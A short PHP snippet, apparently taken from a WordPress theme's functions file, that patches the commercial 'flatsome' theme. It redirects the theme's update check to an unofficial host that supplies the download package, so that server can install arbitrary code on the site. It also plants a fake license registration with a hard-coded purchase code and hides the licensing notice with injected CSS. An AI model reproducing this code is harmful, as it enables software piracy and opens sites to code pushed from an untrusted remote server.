add_filter( 'pre_set_site_transient_update_themes', 'wupdates_check_YL6Wd' );
function wupdates_check_YL6Wd( $transient ) 
{
		if (empty($transient->checked)) {
			return $transient;
		}

		$t = 'flatsome';
		$r = 'https://update.shopwp.net/wp-update?action=get_metadata&slug=' . $t;
		$e = wp_remote_get($r);
		if (is_wp_error($e) || wp_remote_retrieve_response_code($e) != 200) {
			return $transient;
		}
		$remote_version = json_decode(wp_remote_retrieve_body($e));
		if (!$remote_version) {
			return $transient;
		}
		$w = wp_get_theme($t);
		if (version_compare($w->get('Version'), $remote_version->version, '<')) {
			$transient->response[$t] = array(
				'theme'       => $t,
				'new_version' => $remote_version->version,
				'url'         => $remote_version->details_url,
				'package'     => $remote_version->download_url,
			);
		}
		return $transient;
}

$site_url = get_site_url();
$domain_name = wp_parse_url($site_url, PHP_URL_HOST);
$random_id = wp_generate_password(12, false);
$update_option_data = array(
    'id'           => $random_id,
    'type'         => 'PUBLIC',
    'domain'       => $domain_name,
    'registeredAt' => '2021-07-18T12:51:10.826Z',
    'purchaseCode' => '26366b1c-0eb3-46fb-a196-33d20aa32c1d',
    'licenseType'  => 'Regular License',
    'errors'       => array(),
    'show_notice'  => false
);
update_option('flatsome_registration', $update_option_data, 'yes');
add_action('admin_head', 'rmnotice');
function rmnotice() {
    echo '<style> div#flatsome-notice {display: none;}</style>';
}       
